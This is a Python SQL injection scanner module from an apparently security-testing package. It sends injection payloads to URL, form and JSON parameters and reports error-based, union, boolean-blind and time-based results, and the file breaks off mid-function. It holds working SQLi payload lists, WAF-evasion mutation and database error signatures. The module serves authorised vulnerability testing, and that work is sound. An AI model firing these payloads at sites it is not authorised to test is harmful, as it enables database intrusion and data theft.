import time
import logging
import random
import re
import statistics
import threading
from typing import Callable, List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests as _requests

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator
from websecure.core.response_analyzer import ResponseBehaviorAnalyzer
from websecure.core.timing_analyzer import TimingAnalyzer

logger = logging.getLogger(__name__)


def _sqli_severity_from_method(detection_method: str, confidence: str = "medium") -> str:
    """
    Map SQLi detection method + confidence to proper CVSS-aligned severity.

    Rationale:
    - Critical: Data extraction CONFIRMED (union, schema dump, sqlmap verify, stacked)
    - High:     Injection confirmed but data not directly extracted
                (error-based, boolean-blind, time-based 3/3 confirmed, OOB pending)
    - Medium:   Tentative signal only — unknown method with low confidence
    """
    dm = (detection_method or "").lower()
    if dm in ("union_based", "schema_extraction", "sqlmap_confirmed", "stacked_query"):
        return "Critical"
    if dm in (
        "error_based", "json_error", "header_error",
        "adaptive_waf_bypass", "boolean_blind", "oob_dns",
        "time_based", "json_time", "header_time",
    ):
        # time_based confirmed 3/3 by ReproducibilityVerifier → High (CVSS ~8.1)
        # Blind injection = full exploitation path exists even without direct read
        return "High"
    # Unknown method — derive from confidence
    conf_map = {"confirmed": "Critical", "high": "High", "medium": "Medium", "low": "Low"}
    return conf_map.get((confidence or "").lower(), "High")


class SQLInjectionScanner(BaseScanner):
    """
    Robust SQL Injection Scanner.
    Features:
    - Error-based detection with baseline comparison (no false positives)
    - Boolean-based blind detection (content length/hash comparison)
    - Time-based blind detection with dynamic threshold (baseline + delta)
    - WAF Evasion integration via Mutator
    - Parallel payload testing via BaseScanner.run_parallel_probes()
    """

    name = "sqli"
    phase = "offensive"

    MAX_WORKERS = 5          # parallel threads for payload testing
    TIME_DELTA = 3.0         # seconds above baseline to flag time-based
    MAX_FORM_PAYLOADS = 12   # payload cap per form input
    _NAT_VAR_CACHE_TTL = 300  # seconds before natural-variation cache expires
    _TIMING_CACHE_TTL  = 300  # seconds before baseline-timing cache expires

    # Signatures for Error-Based SQLi
    ERRORS = {
        "MySQL": (
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*",
            r"valid MySQL result", r"MySqlClient\.",
        ),
        "PostgreSQL": (
            r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result", r"Npgsql\.",
        ),
        "Microsoft SQL Server": (
            r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        ),
        "Microsoft Access": (
            r"Microsoft Access Driver", r"JET Database Engine",
            r"Access Database Engine",
        ),
        "Oracle": (
            r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
            r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*",
        ),
        "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
        "SQLite": (
            r"SQLite/JDBCDriver", r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]",
        ),
        "Sybase": (
            r"(?i)Sybase message", r"Sybase.*Server message",
            r"SybSQLException",
        ),
        "MariaDB": (
            r"You have an error in your SQL syntax.*MariaDB",
            r"Warning.*mariadb_",
            r"valid MariaDB result",
        ),
        "H2": (
            r"Syntax error in SQL statement",
            r"Column .* not found",
        ),
        "HSQL": (
            r"Unexpected token.*in statement",
        ),
        "Firebird": (
            r"Dynamic SQL Error",
            r"SQL error code = -\d+",
        ),
        "Informix": (
            r"A syntax error has occurred",
            r"Informix",
        ),
        "MongoDB": (
            r"MongoError",
            r"Failed to parse",
            r"\"errmsg\"",
        ),
    }

    def __init__(self, session=None, results=None, debug=False):
        super().__init__(session, results, debug)
        self.payloads = self._load_payloads()
        # Per-instance cache: url -> (mean, stdev, timestamp) so _measure_natural_variation
        # runs 4 HTTP requests ONCE per URL instead of once per parameter.
        # Entries expire after _NAT_VAR_CACHE_TTL seconds to prevent stale measurements
        # during long scans with changing server behaviour.
        self._nat_var_cache: Dict[str, Tuple[float, float, float]] = {}
        self._nat_var_lock = threading.Lock()
        # Separate timing baseline cache (mean_s, stdev_s, timestamp) per URL.
        # Prevents the single-sample distortion problem where fetch_baseline() returns
        # a cached response (~0 ms), making time_threshold artificially low and causing
        # excessive false-positive first-pass triggers in time-based detection.
        self._timing_baseline_cache: Dict[str, Tuple[float, float, float]] = {}
        self._timing_baseline_lock = threading.Lock()
        # Plan B: Nessus-style response behaviour analysis + statistical timing
        self._rba = ResponseBehaviorAnalyzer(self.session)
        self._timing = TimingAnalyzer(self.session, baseline_n=4)

    def _load_payloads(self) -> List[str]:
        """Loads SQLi payloads. Falls back to built-in list if wordlist unavailable."""
        try:
            from websecure.core.payloads import get_payloads
            loaded = get_payloads("sqli")
            if loaded:
                return loaded
        except (ImportError, OSError, ValueError) as exc:
            logger.warning(f"[SQLi] Could not load external payloads, using built-in: {exc!r}")
        return [
            "'", '"', "')", '");',
            "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--',
            "' UNION SELECT 1,2,3--", '" UNION SELECT 1,2,3--',
            "' AND 1=0 UNION SELECT 1,version()--",
            "'; WAITFOR DELAY '0:0:5'--",   # MSSQL time-based
            "'; SELECT SLEEP(5)--",          # MySQL time-based
            "' || pg_sleep(5)--",            # PostgreSQL time-based
        ]

    def _extract_error_fingerprints(self, text: str) -> set:
        """Returns the set of (db, regex) pairs matching the given text."""
        found = set()
        for db, regexes in self.ERRORS.items():
            for r in regexes:
                if re.search(r, text, re.I):
                    found.add((db, r))
        return found

    def _is_time_payload(self, payload: str) -> bool:
        p = payload.upper()
        return any(kw in p for kw in ("SLEEP", "WAITFOR", "PG_SLEEP", "DBMS_PIPE"))

    def _is_union_payload(self, payload: str) -> bool:
        p = payload.upper()
        return "UNION" in p and "SELECT" in p

    # Union-based: responses that echo column values from UNION SELECT
    _UNION_MARKERS = [
        "wsunion1337",
        "WSUNION_MARKER",
        "@@version",
        "user()",
        "database()",
    ]

    # Max columns to try for UNION-based probing
    _UNION_MAX_COLS = 10

    def _try_union_based(self, url: str, param: str) -> Optional[Tuple[str, str]]:
        """
        Attempt UNION-based SQLi by probing column counts 1-N.
        Returns (payload, evidence) if a successful UNION injection is detected.
        """
        marker = "wsunion1337"
        for cols in range(1, self._UNION_MAX_COLS + 1):
            # Build NULL-padded union select with our marker in pos 1
            null_cols = ["NULL"] * cols
            null_cols[0] = f"'{marker}'"
            union_str = ",".join(null_cols)
            for quote in ("'", '"', ""):
                payload = f"{quote} UNION SELECT {union_str}-- -"
                test_url = self.inject_param(url, param, payload)
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if marker in (resp.text or ""):
                        evidence = (
                            f"Union-based: marker '{marker}' reflected in response "
                            f"with {cols}-column UNION SELECT"
                        )
                        return payload, evidence
                except _requests.exceptions.RequestException as exc:
                    logger.debug(f"[SQLi] Union probe failed for cols={cols}: {exc!r}")
                    continue
        return None

    # Boolean-blind payloads: (true_payload, false_payload)
    _BOOL_PAIRS: List[Tuple[str, str]] = [
        ("' AND 1=1--",   "' AND 1=2--"),
        ("' AND 'a'='a",  "' AND 'a'='b"),
        ("\" AND 1=1--",  "\" AND 1=2--"),
        ("1 AND 1=1",     "1 AND 1=2"),
        ("' OR 1=1--",    "' OR 1=2--"),
    ]
    # Minimum absolute difference (bytes) to consider a boolean-blind hit real.
    # The dynamic stddev guard below is the primary gate; this is a hard floor.
    # 20 bytes is sufficient — most injections produce at least this much delta,
    # and stddev guard already filters random noise from dynamic content.
    _BOOL_MIN_DIFF_BYTES = 20

    def _measure_natural_variation(self, url: str, n: int = 4) -> Tuple[float, float]:
        """
        Sample n benign baseline requests and return (mean_len, stddev_len).
        Result is cached per URL so multiple parameters on the same endpoint
        don't trigger redundant HTTP requests (saves ~4 requests per extra param).
        Cache expires after _NAT_VAR_CACHE_TTL seconds to prevent stale data
        during long scans where server responses may change.
        """
        now = time.monotonic()
        with self._nat_var_lock:
            if url in self._nat_var_cache:
                mean, stdev, ts = self._nat_var_cache[url]
                if now - ts < self._NAT_VAR_CACHE_TTL:
                    return mean, stdev
                # Stale — remove and re-sample
                del self._nat_var_cache[url]

        lengths: List[int] = []
        for _ in range(n):
            try:
                r = self.session.get(url, timeout=10)
                lengths.append(len(r.text))
            except _requests.exceptions.RequestException as _fix_e:
                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        if len(lengths) < 2:
            mean = float(lengths[0]) if lengths else 0.0
            result = (mean, mean * 0.15, time.monotonic())
        else:
            mean = statistics.mean(lengths)
            stdev = statistics.stdev(lengths)
            result = (mean, stdev, time.monotonic())

        with self._nat_var_lock:
            self._nat_var_cache[url] = result
        return result[0], result[1]

    def _get_response_len(self, url: str, param: str, value: str) -> Optional[int]:
        """Helper: inject `value` for `param` and return response length, or None on error."""
        try:
            r = self.session.get(self.inject_param(url, param, value), timeout=10)
            return len(r.text)
        except _requests.exceptions.RequestException as exc:
            logger.debug(f"[SQLi] _get_response_len error ({url} param={param}): {exc!r}")
            return None

    def _boolean_blind_test(self, url: str, param: str, value: str) -> Optional[Dict]:
        """
        True/False payload pair approach with confidence metric.
        Tests at least 3 pairs and requires consistent, statistically significant difference.
        Returns a finding dict or None.
        """
        true_payloads = [
            f"{value}' AND '1'='1",
            f"{value}' AND 1=1--",
            f"{value}\" AND \"1\"=\"1",
        ]
        false_payloads = [
            f"{value}' AND '1'='2",
            f"{value}' AND 1=2--",
            f"{value}\" AND \"1\"=\"2",
        ]

        # Baseline
        baseline_len = self._get_response_len(url, param, value)
        if baseline_len is None:
            return None

        true_lens: List[float] = []
        false_lens: List[float] = []

        for tp, fp in zip(true_payloads, false_payloads):
            tl = self._get_response_len(url, param, tp)
            fl = self._get_response_len(url, param, fp)
            if tl is not None:
                true_lens.append(float(tl))
            if fl is not None:
                false_lens.append(float(fl))

        if not true_lens or not false_lens:
            return None

        avg_true = sum(true_lens) / len(true_lens)
        avg_false = sum(false_lens) / len(false_lens)

        diff = abs(avg_true - avg_false)
        diff_pct = diff / max(avg_true, 1)

        # True payload should be close to baseline; false payload should differ
        baseline_diff_true = abs(baseline_len - avg_true)
        baseline_diff_false = abs(baseline_len - avg_false)

        if diff > 50 and diff_pct > 0.05 and baseline_diff_true < baseline_diff_false:
            confidence = "high" if diff_pct > 0.15 else "medium"
            return {
                "type": "Boolean-based Blind SQLi",
                "confidence": confidence,
                "severity": "High" if diff_pct > 0.15 else "Medium",
                "evidence": {
                    "true_avg_len": avg_true,
                    "false_avg_len": avg_false,
                    "diff": diff,
                    "diff_pct": f"{diff_pct:.1%}",
                },
            }
        return None

    def _is_boolean_blind(self, url: str, param: str,
                          baseline_len: int) -> Optional[Tuple[str, str]]:
        """
        Compare TRUE vs FALSE condition response lengths.

        Detection requires ALL of:
          1. |len_true - len_false| >= _BOOL_MIN_DIFF_BYTES  (hard floor)
          2. diff > natural_mean + 3 * natural_stdev          (dynamic guard)
          3. Cross-validation: a second independent pair confirms the pattern
             (len_true2 ~ len_true AND len_false2 ~ len_false)

        Returns (payload, evidence) only when all gates pass.
        """
        # Measure natural content churn (4 benign requests)
        nat_mean, nat_stdev = self._measure_natural_variation(url)
        # Gate: signal must exceed natural churn by 3 sigma
        dynamic_threshold = nat_mean + 3.0 * nat_stdev

        candidate: Optional[Tuple[str, str, int, int]] = None  # (true_pl, false_pl, len_t, len_f)

        for true_pl, false_pl in self._BOOL_PAIRS:
            try:
                r_true  = self.session.get(self.inject_param(url, param, true_pl),  timeout=10)
                r_false = self.session.get(self.inject_param(url, param, false_pl), timeout=10)
                len_true  = len(r_true.text)
                len_false = len(r_false.text)
                diff = abs(len_true - len_false)

                if diff < self._BOOL_MIN_DIFF_BYTES:
                    continue
                if diff <= dynamic_threshold:
                    continue

                # First-pass hit — record for cross-validation
                candidate = (true_pl, false_pl, len_true, len_false)
                break
            except _requests.exceptions.RequestException as exc:
                logger.debug(f"[SQLi] Boolean probe error ({url}): {exc!r}")
                continue

        if candidate is None:
            return None

        true_pl, false_pl, len_true1, len_false1 = candidate

        # Cross-validation: repeat the winning pair independently
        try:
            r_true2  = self.session.get(self.inject_param(url, param, true_pl),  timeout=10)
            r_false2 = self.session.get(self.inject_param(url, param, false_pl), timeout=10)
            len_true2  = len(r_true2.text)
            len_false2 = len(r_false2.text)

            # TRUE responses should be similar to each other
            true_stable  = abs(len_true1  - len_true2)  <= max(nat_stdev * 2, 30)
            # FALSE responses should be similar to each other
            false_stable = abs(len_false1 - len_false2) <= max(nat_stdev * 2, 30)
            # TRUE and FALSE responses must still differ
            cross_diff   = abs(len_true2 - len_false2)

            if not (true_stable and false_stable and cross_diff >= self._BOOL_MIN_DIFF_BYTES):
                logger.debug(
                    f"[SQLi] Boolean-blind cross-validation FAILED for {url} param={param} "
                    f"true_stable={true_stable} false_stable={false_stable} cross_diff={cross_diff}"
                )
                return None

        except _requests.exceptions.RequestException as exc:
            logger.debug(f"[SQLi] Boolean cross-validation error ({url}): {exc!r}")
            return None

        diff_final = abs(len_true2 - len_false2)
        evidence = (
            f"Boolean-blind (cross-validated): "
            f"TRUE={len_true1}B/{len_true2}B, FALSE={len_false1}B/{len_false2}B, "
            f"diff={diff_final}B | natural_stdev={nat_stdev:.1f}B, threshold={dynamic_threshold:.0f}B"
        )
        return true_pl, evidence

    def _measure_baseline_timing(self, url: str, n: int = 3) -> Tuple[float, float]:
        """
        Measure n baseline (non-injected) request times to compute mean + stdev.
        Used to set a statistically robust threshold for time-based SQLi detection.
        Returns (mean_seconds, stdev_seconds).
        """
        times: List[float] = []
        for _ in range(n):
            t0 = time.time()
            try:
                self.session.get(url, timeout=15)
                times.append(time.time() - t0)
            except _requests.exceptions.RequestException as _fix_e:
                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        if len(times) < 2:
            mean = times[0] if times else 1.0
            return mean, mean * 0.2
        mean = statistics.mean(times)
        stdev = statistics.stdev(times)
        return mean, stdev

    def _get_time_threshold(self, url: str) -> float:
        """
        Return the statistically calibrated time-delay threshold for `url`.

        Uses a cached 3-sample baseline (TTL: _TIMING_CACHE_TTL seconds) so the
        measurement is shared across all parameters on the same endpoint.

        This fixes the single-sample distortion bug: when fetch_baseline() returns
        a cached response in ~0 ms, computing `baseline_time + TIME_DELTA` yields
        TIME_DELTA (3 s) even for servers that naturally respond in 5+ s, causing
        every payload to trip the first-pass gate and trigger expensive verification.

        Formula: max(mean + 3*stdev, mean + TIME_DELTA, 2.0)
        """
        now = time.monotonic()
        with self._timing_baseline_lock:
            if url in self._timing_baseline_cache:
                bl_mean, bl_stdev, ts = self._timing_baseline_cache[url]
                if now - ts < self._TIMING_CACHE_TTL:
                    return max(bl_mean + 3.0 * bl_stdev, bl_mean + self.TIME_DELTA, 2.0)
                del self._timing_baseline_cache[url]

        bl_mean, bl_stdev = self._measure_baseline_timing(url, n=3)
        with self._timing_baseline_lock:
            self._timing_baseline_cache[url] = (bl_mean, bl_stdev, time.monotonic())
        return max(bl_mean + 3.0 * bl_stdev, bl_mean + self.TIME_DELTA, 2.0)

    def _verify_time_based(
        self,
        url: str,
        param_name: str,
        payload: str,
        time_threshold: float,
        n: int = 3,
        min_hits: int = 3,
    ) -> bool:
        """
        Triple-confirmation time-based SQLi verification.

        Re-send the time-based payload n times; require ALL n hits (min_hits=3/3)
        to exceed the dynamic threshold: baseline_mean + 3*baseline_stdev, or at
        minimum 4 seconds, whichever is higher.

        Eliminates single-spike and double-spike false positives caused by
        transient network latency or server hiccups.
        """
        # Compute dynamic threshold from baseline timing
        bl_mean, bl_stdev = self._measure_baseline_timing(url, n=3)
        dynamic_threshold = max(bl_mean + 3.0 * bl_stdev, 4.0, time_threshold)

        hits = 0
        for _ in range(n):
            injected = self.inject_param(url, param_name, payload)
            t0 = time.time()
            try:
                self.session.get(injected, timeout=dynamic_threshold + 8)
                elapsed = time.time() - t0
                if elapsed >= dynamic_threshold:
                    hits += 1
            except _requests.exceptions.Timeout:
                hits += 1  # timeout itself is evidence of delay
            except _requests.exceptions.RequestException as _fix_e:
                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
        return hits >= min_hits

    def run(self, url, **kwargs):
        urls = url if isinstance(url, list) else [url]
        for u in urls:
            self.scan_url(u)
            self.scan_cmdi_url(u)

        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            if all_forms:
                self.scan_forms(all_forms)

        # --- Adım 3 eklentileri: OOB / Stacked / Adaptive / SQLMap ---------
        self._run_oob_phase(urls)
        self._run_stacked_query_phase(urls)
        self._run_adaptive_scan(urls)
        if urls:
            self._run_sqlmap_bridge(urls[0])

        # --- Adım 4: Second-order & Stored SQLi probing ----------------------
        self._run_second_order_phase(urls)
        self._run_stored_sqli_phase(urls)

    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"[SQLi] Scanning URL params: {url}")

        # Baseline — proper error handling via fetch_baseline()
        baseline_resp = self.fetch_baseline(url, timeout=10)
        if not baseline_resp:
            return
        baseline_errors = self._extract_error_fingerprints(baseline_resp.text)
        # Use statistically calibrated threshold (3-sample mean + 3σ) instead of a
        # single cached fetch time, which would be ~0 ms and make TIME_DELTA too low.
        time_threshold = self._get_time_threshold(url)
        baseline_len = len(baseline_resp.text) if baseline_resp.text else 0

        for param_name, _ in params:
            # Error-based + time-based (all payloads in parallel)
            self._test_param_parallel(
                url, param_name, baseline_errors, time_threshold
            )

            # Plan B: RBA differential analysis — catches error responses that
            # don't match known DB signatures (custom error pages, hidden errors)
            self._rba_differential_scan(url, param_name)

            # Plan B: enhanced timing with statistical cross-validation
            self._enhanced_timing_scan(url, param_name)

            # Union-based detection — independent of error results
            union_result = self._try_union_based(url, param_name)
            if union_result:
                payload, evidence = union_result
                self.report_finding(
                    vuln_type="SQL Injection (Union-Based)",
                    url=url,
                    param=param_name,
                    payload=payload,
                    severity="Critical",
                    evidence=evidence,
                    detection_method="union_based",
                    verified=True,
                    confidence="confirmed",
                )

            # Boolean-blind fallback — independent, always run
            bool_result = self._is_boolean_blind(url, param_name, baseline_len)
            if bool_result:
                payload, evidence = bool_result
                self.report_finding(
                    vuln_type="SQL Injection (Boolean-Blind)",
                    url=url,
                    param=param_name,
                    payload=payload,
                    severity="Critical",
                    evidence=evidence,
                    detection_method="boolean_blind",
                    verified=True,
                    confidence="high",
                )

            # Complementary boolean-blind test using value-anchored pairs (3-pair method)
            # Runs only when the param has an original value to anchor against
            original_value = dict(params).get(param_name, "1")
            bool_test_result = self._boolean_blind_test(url, param_name, original_value)
            if bool_test_result:
                ev = bool_test_result.get("evidence", {})
                t_avg = ev.get("true_avg_len", 0)
                f_avg = ev.get("false_avg_len", 0)
                ev_diff = ev.get("diff", 0)
                evidence_str = (
                    f"Boolean-blind (3-pair value-anchored): "
                    f"true_avg={t_avg:.0f}B, false_avg={f_avg:.0f}B, "
                    f"diff={ev_diff:.0f}B ({ev.get('diff_pct', '?')})"
                )
                self.report_finding(
                    vuln_type="SQL Injection (Boolean-Blind, Value-Anchored)",
                    url=url,
                    param=param_name,
                    payload=f"{original_value}' AND '1'='1 vs '1'='2",
                    severity=bool_test_result.get("severity", "High"),
                    evidence=evidence_str,
                    detection_method="boolean_blind_value_anchored",
                    verified=True,
                    confidence=bool_test_result.get("confidence", "medium"),
                )

        # JSON body injection — test params as JSON payload
        self._scan_json_body(url, params, baseline_errors, time_threshold)

        # HTTP header injection — inject into common headers
        self._scan_header_injection(url, baseline_errors, time_threshold)

    # -------------------------------------------------------------------------
    # Plan B: RBA differential analysis
    # -------------------------------------------------------------------------

    # Focused probe set for differential analysis — covers all major DBs without
    # relying on known error signatures (catches custom error pages too)
    _RBA_PROBE_PAYLOADS: List[str] = [
        "'",
        '"',
        "' OR '1'='1",
        "' AND 1=CONVERT(int,@@version)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "1 AND 1=2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "'; SELECT 1--",
        "1' AND SLEEP(0)--",
    ]

    def _rba_differential_scan(self, url: str, param_name: str) -> None:
        """
        Nessus-style: compare baseline vs injected response structure.
        Detects injection even when DB errors are custom-paged or hidden.
        Runs per-param with a shared RBA instance.
        """
        baseline = self._rba.capture_baseline(url, param_name, n_samples=2, timeout=10)
        if baseline is None:
            return

        for payload in self._RBA_PROBE_PAYLOADS:
            injected_url = self.inject_param(url, param_name, payload)
            diff = self._rba.analyse(baseline, injected_url, payload, timeout=12)
            if diff is None or not diff.is_reportable:
                continue

            # Avoid re-reporting what error-based scan already caught
            if diff.new_db_errors:
                db_labels = {fp.split(":")[0] for fp in diff.new_db_errors}
                self.report_finding(
                    vuln_type="SQL Injection (Differential/DB Error)",
                    url=url,
                    param=param_name,
                    payload=payload,
                    severity="High",
                    evidence=(
                        f"RBA: new DB error signature detected | "
                        f"DB: {', '.join(sorted(db_labels))} | "
                        f"{diff.evidence_summary}"
                    ),
                    detection_method="error_based",
                    confidence=self._rba.confidence_label(diff.confidence),
                    verified=diff.confidence >= 0.80,
                )
            elif diff.new_framework_errors:
                fw_labels = {fp.split(":")[1] for fp in diff.new_framework_errors if ":" in fp}
                self.report_finding(
                    vuln_type="SQL Injection (Differential/Framework Error)",
                    url=url,
                    param=param_name,
                    payload=payload,
                    severity="Medium",
                    evidence=(
                        f"RBA: framework error triggered | "
                        f"Framework: {', '.join(sorted(fw_labels))} | "
                        f"{diff.evidence_summary}"
                    ),
                    detection_method="error_based",
                    confidence=self._rba.confidence_label(diff.confidence),
                )
            elif diff.status_changed and diff.new_status == 500:
                self.report_finding(
                    vuln_type="SQL Injection (Differential/500 Error)",
                    url=url,
                    param=param_name,
                    payload=payload,
                    severity="Medium",
                    evidence=(
                        f"RBA: HTTP 500 triggered by injection | "
                        f"{diff.evidence_summary}"
                    ),
                    detection_method="error_based",
                    confidence=self._rba.confidence_label(diff.confidence),
                )
            # Stop after first reportable finding per param (one finding = one report)
            break

    _TIMING_PAYLOADS: List[Tuple[str, float, str]] = [
        ("' AND SLEEP(3)-- -",         3.0, "mysql"),
        ("'; WAITFOR DELAY '0:0:3'-- -", 3.0, "mssql"),
        ("' OR pg_sleep(3)-- -",       3.0, "postgresql"),
        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99),3)-- -", 3.0, "oracle"),
        ("' AND 3=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -", 3.0, "sqlite"),
    ]

    def _enhanced_timing_scan(self, url: str, param_name: str) -> None:
        """
        Statistical timing detection using TimingAnalyzer.
        Replaces ad-hoc `_verify_time_based()` for URL parameters.
        Requires 3/3 cross-validated hits above dynamic threshold.
        """
        timing_baseline = self._timing.capture_baseline(url, param_name, timeout=12)
        if timing_baseline is None:
            return

        for payload, expected_delay, db_hint in self._TIMING_PAYLOADS:
            result = self._timing.probe(
                url, param_name, payload, self.inject_param,
                baseline=timing_baseline,
                timeout=20,
                expected_delay=expected_delay,
            )
            if result and result.confirmed:
                self.report_finding(
                    vuln_type=f"SQL Injection (Time-Based, {db_hint.upper()})",
                    url=url,
                    param=param_name,
                    payload=payload,
                    severity=_sqli_severity_from_method("time_based", "high"),
                    evidence=result.evidence,
                    detection_method="time_based",
                    confidence="high",
                    verified=True,
                )
                break  # first confirmed timing hit per param is sufficient

    def _test_param_parallel(
        self,
        url: str,
        param_name: str,
        baseline_errors: set,
        time_threshold: float,
    ) -> bool:
        """Tests all payloads for one parameter using a thread pool. Returns True if vuln found."""
        def probe(payload: str) -> Optional[Dict]:
            if random.random() < 0.3:
                mutated = Mutator.mutate_sql(payload)
                curr = random.choice(mutated) if mutated else payload
            else:
                curr = payload

            injected = self.inject_param(url, param_name, curr)
            t0 = time.time()
            try:
                res = self.session.get(injected, timeout=12)
                elapsed = time.time() - t0
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[SQLi] Probe timed out for {injected}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[SQLi] Probe connection error for {injected}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[SQLi] Probe request failed for {injected}: {exc!r}")
                return None

            # Error-based: only flag NEW errors not seen in baseline
            new_errors = self._extract_error_fingerprints(res.text) - baseline_errors
            if new_errors:
                db = next(iter(new_errors))[0]
                return {
                    "vuln_type": "SQL Injection (Error)",
                    "url": url,
                    "param": param_name,
                    "payload": curr,
                    "evidence": f"DB: {db} — new error signature in response",
                    "detection_method": "error_based",
                    "confidence": "high",
                }

            # Time-based — first-pass flag only; cross-validate before reporting
            if self._is_time_payload(curr) and elapsed > time_threshold:
                if self._verify_time_based(url, param_name, curr, time_threshold):
                    return {
                        "vuln_type": "SQL Injection (Time-Based)",
                        "url": url,
                        "param": param_name,
                        "payload": curr,
                        "evidence": (
                            f"Time-based (cross-validated): first={elapsed:.2f}s, "
                            f"threshold={time_threshold:.2f}s"
                        ),
                        "detection_method": "time_based",
                        "confidence": "high",
                        "verified": True,
                    }
            return None

        hits = self.run_parallel_probes(probe, self.payloads, max_workers=self.MAX_WORKERS)
        for hit in hits:
            sev = _sqli_severity_from_method(
                hit.get("detection_method", ""), hit.get("confidence", "medium")
            )
            self.report_finding(severity=sev, **hit)
        return bool(hits)

    def scan_forms(self, forms: List[Dict]):
        logger.info(f"[SQLi] Scanning {len(forms)} forms...")
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                continue

            skipped = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped]

            # Form baseline
            base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
            baseline_resp = self.fetch_baseline(action, method=method, data=base_data, timeout=10)
            baseline_errors: set = set()
            if baseline_resp:
                baseline_errors = self._extract_error_fingerprints(baseline_resp.text)

            # Statistically calibrated time threshold — shared cache prevents
            # redundant baseline measurement across parameters on the same form.
            time_threshold = self._get_time_threshold(action)
            payloads = self.payloads[:self.MAX_FORM_PAYLOADS]

            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name:
                    continue
                # Test ALL inputs — never stop early; multi-param forms may have
                # several vulnerable fields (e.g. username AND password both injectable)
                self._test_form_param_parallel(
                    action, method, inputs, p_name, payloads,
                    baseline_errors, time_threshold
                )

    def _test_form_param_parallel(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        p_name: str,
        payloads: List[str],
        baseline_errors: set,
        time_threshold: float,
    ) -> bool:
        base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}

        def probe(payload: str) -> Optional[Dict]:
            form_data = dict(base_data)
            form_data[p_name] = payload
            t0 = time.time()
            try:
                if method == "POST":
                    res = self.session.post(action, data=form_data, timeout=12)
                else:
                    res = self.session.get(action, params=form_data, timeout=12)
                elapsed = time.time() - t0
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[SQLi] Form probe timed out for {action}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[SQLi] Form probe connection error for {action}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[SQLi] Form probe failed for {action}: {exc!r}")
                return None

            new_errors = self._extract_error_fingerprints(res.text) - baseline_errors
            if new_errors:
                db = next(iter(new_errors))[0]
                return {
                    "vuln_type": "SQLi (Form/Error)",
                    "url": action,
                    "param": p_name,
                    "payload": payload,
                    "evidence": f"DB: {db}",
                    "detection_method": "error_based",
                    "confidence": "high",
                }

            if self._is_time_payload(payload) and elapsed > time_threshold:
                # Cross-validate before reporting — mirrors URL-parameter time-based
                # detection to prevent single-spike false positives in form fields.
                if self._verify_time_based(action, p_name, payload, time_threshold):
                    return {
                        "vuln_type": "SQLi (Form/Time)",
                        "url": action,
                        "param": p_name,
                        "payload": payload,
                        "evidence": (
                            f"Time-based (cross-validated): first={elapsed:.2f}s, "
                            f"threshold={time_threshold:.2f}s"
                        ),
                        "detection_method": "time_based",
                        "confidence": "high",
                        "verified": True,
                    }
            return None

        hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
        for hit in hits:
            sev = _sqli_severity_from_method(
                hit.get("detection_method", ""), hit.get("confidence", "medium")
            )
            self.report_finding(severity=sev, **hit)
        return bool(hits)

    # -------------------------------------------------------------------------
    # JSON body injection
    # -------------------------------------------------------------------------

    # Lightweight set of probes used exclusively for JSON/header injection.
    # Full wordlist already covers GET/POST form params; these are targeted
    # at the common REST API patterns where injection often lives undetected.
    _SQLI_JSON_PROBES = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' AND SLEEP(3)--",
        "1 AND 1=CONVERT(int,@@version)--",
        "1; SELECT pg_sleep(3)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "ws_so_' OR '1'='1",   # second-order marker
    ]

    def _scan_json_body(
        self,
        url: str,
        params: List[Tuple[str, str]],
        baseline_errors: set,
        time_threshold: float,
    ) -> None:
        """
        Re-send the same URL parameters as a JSON body (Content-Type: application/json).
        Many REST APIs accept both forms; WAFs often miss JSON-body injection.
        """
        if not params:
            return
        base_json = {k: v for k, v in params}
        for key in list(base_json.keys()):
